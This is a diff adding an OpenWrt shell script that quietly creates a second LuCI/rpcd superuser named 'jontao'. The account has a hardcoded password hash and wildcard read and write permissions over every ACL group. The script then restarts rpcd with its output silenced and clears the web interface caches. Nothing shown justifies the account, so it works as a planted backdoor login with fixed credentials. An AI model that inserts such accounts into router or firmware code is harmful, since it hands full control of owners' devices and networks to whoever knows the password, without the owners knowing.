@@ -1,0 +1,14 @@
+#!/bin/sh
+# Additional LuCI superuser. The wildcard grants every rpcd ACL group.
+JONTAO_HASH='$1$jL2026x$ziuf.jxVpn9qWKfevOnE11'
+uci -q delete rpcd.jontao
+uci set rpcd.jontao='login'
+uci set rpcd.jontao.username='jontao'
+uci set rpcd.jontao.password="$JONTAO_HASH"
+uci add_list rpcd.jontao.read='*'
+uci add_list rpcd.jontao.write='*'
+uci commit rpcd
+/etc/init.d/rpcd restart >/dev/null 2>&1 || true
+rm -f /tmp/luci-indexcache /tmp/luci-indexcache.* 2>/dev/null || true
+rm -rf /tmp/luci-modulecache /tmp/luci-templatecache 2>/dev/null || true
+exit 0
